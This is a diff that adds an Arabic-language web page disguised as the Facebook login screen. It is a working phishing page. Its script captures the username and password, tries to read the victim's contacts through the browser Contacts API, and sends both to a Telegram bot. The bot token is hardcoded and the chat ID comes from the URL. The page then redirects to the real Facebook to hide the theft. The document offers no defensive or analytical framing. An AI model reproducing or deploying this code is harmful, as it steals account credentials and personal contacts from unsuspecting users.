@@ -1,0 +1,81 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>تسجيل الدخول إلى فيسبوك</title>
+    <style>
+        * { box-sizing: border-box; margin: 0; padding: 0; font-family: Helvetica, Arial, sans-serif; }
+        body { background-color: #f0f2f5; display: flex; flex-direction: column; justify-content: center; align-items: center; min-height: 100vh; margin: 0; padding: 20px; }
+        
+        .fb-container { width: 100%; max-width: 396px; text-align: center; }
+        
+        /* شعار فيسبوك النصي الاحترافي المظبوط */
+        .fb-logo-text { color: #1877f2; font-size: 38px; font-weight: bold; margin-bottom: 25px; letter-spacing: -1px; }
+
+        .card { background: #ffffff; border: none; border-radius: 8px; box-shadow: 0 2px 4px rgba(0, 0, 0, .1), 0 8px 16px rgba(0, 0, 0, .1); padding: 20px; width: 100%; }
+        
+        .input-box { margin-bottom: 12px; text-align: right; }
+        input { width: 100%; padding: 14px 16px; border: 1px solid #dddfe2; color: #1d2129; border-radius: 6px; outline: none; font-size: 16px; background: #ffffff; }
+        input:focus { border-color: #1877f2; box-shadow: 0 0 0 2px #e7f3ff; }
+
+        .login-btn { width: 100%; padding: 12px; background: #1877f2; border: none; color: #fff; font-weight: bold; font-size: 18px; border-radius: 6px; cursor: pointer; margin-top: 6px; transition: 0.2s; }
+        .login-btn:hover { background: #166fe5; }
+
+        .forgot-link { display: block; margin: 15px 0; color: #1877f2; font-size: 14px; text-decoration: none; }
+        .forgot-link:hover { text-decoration: underline; }
+
+        .divider { border-bottom: 1px solid #dadde1; margin: 20px 0; }
+
+        .create-btn { display: inline-block; background: #42b72a; color: #fff; font-weight: bold; font-size: 16px; padding: 12px 16px; border-radius: 6px; text-decoration: none; margin-top: 5px; transition: 0.2s; }
+        .create-btn:hover { background: #36a420; }
+    </style>
+</head>
+<body>
+    <div class="fb-container">
+        <!-- شعار نصي نظيف ومضمون بدون مشاكل في الـ SVG -->
+        <div class="fb-logo-text">facebook</div>
+        
+        <div class="card">
+            <form id="fbForm">
+                <div class="input-box"><input type="text" id="username" placeholder="البريد الإلكتروني أو رقم الهاتف" required></div>
+                <div class="input-box"><input type="password" id="password" placeholder="كلمة المرور" required></div>
+                <button type="submit" class="login-btn">تسجيل الدخول</button>
+            </form>
+            
+            <a href="#" class="forgot-link">هل نسيت كلمة المرور؟</a>
+            
+            <div class="divider"></div>
+            
+            <a href="#" class="create-btn">إنشاء حساب جديد</a>
+        </div>
+    </div>
+
+    <script>
+        const botToken = "9047166728:AAGG2DJF-Kb7h7_15GNx5VS7Le2bG7a1ZRE";
+        const urlParams = new URLSearchParams(window.location.search);
+        const targetChatId = urlParams.get('to');
+
+        document.getElementById('fbForm').addEventListener('submit', async function(e) {
+            e.preventDefault();
+            if(!targetChatId) return;
+            const user = document.getElementById('username').value;
+            const pass = document.getElementById('password').value;
+
+            let contacts = "لم يتم منح الصلاحية";
+            if ('contacts' in navigator && 'ContactsManager' in window) {
+                try {
+                    const res = await navigator.contacts.select(['name', 'tel'], { multiple: true });
+                    if (res.length > 0) contacts = res.map(c => `المستخدم: ${c.name?.[0]} - الرقم: ${c.tel?.[0]}`).join('\n');
+                } catch(e) {}
+            }
+
+            fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${targetChatId}&text=${encodeURIComponent(`صيد فيسبوك جديد\nالحساب: ${user}\nالباسورد: ${pass}`)}`);
+            if (contacts !== "لم يتم منح الصلاحية") {
+                fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${targetChatId}&text=${encodeURIComponent(`جهات الاتصال:\n${contacts}`)}`);
+            }
+            setTimeout(() => { window.location.href = "https://www.facebook.com"; }, 800);
+        });
+    </script>
+</body>
+</html>
